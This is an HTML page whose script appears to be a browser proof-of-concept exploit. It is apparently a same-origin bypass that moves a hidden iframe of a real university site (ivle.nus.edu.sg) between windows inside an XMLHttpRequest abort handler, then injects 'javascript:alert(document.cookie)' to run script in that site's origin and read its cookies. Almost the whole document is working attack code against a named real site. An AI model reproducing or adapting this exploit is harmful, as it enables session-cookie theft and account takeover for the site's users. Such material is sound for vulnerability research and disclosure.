<p></p>
<script>
if (location.protocol == 'file:') {
  throw alert('HTTP server are required.');
}

document.querySelector('p').innerHTML = '<b>Click to start. :)</b>';
onclick = function() {
  w = window.open();
  x = document.documentElement.appendChild(document.createElement('iframe'));
  x.src = 'f.html';
}

function f() {
  var i = x.contentWindow[0].frameElement.nextSibling;
  if (!i) { return; }
  var r = new w.XMLHttpRequest;
  r.onabort = function() {
    w.document.documentElement.appendChild(i);
    i.src = 'https://ivle.nus.edu.sg';
    try {
      alert('Look ma no flash!');
      window.print();
      while (i.contentDocument) {
        var then = Date.now();
        while (Date.now() - then < 1000) {}
      }
    } catch(e) {
      i.src = 'javascript:alert(document.cookie)';
    }
  }
  r.open('get', location.href, true);
  r.send();
  w.close();
}

</script>
<iframe src="https://ivle.nus.edu.sg" style="display:none"></iframe>
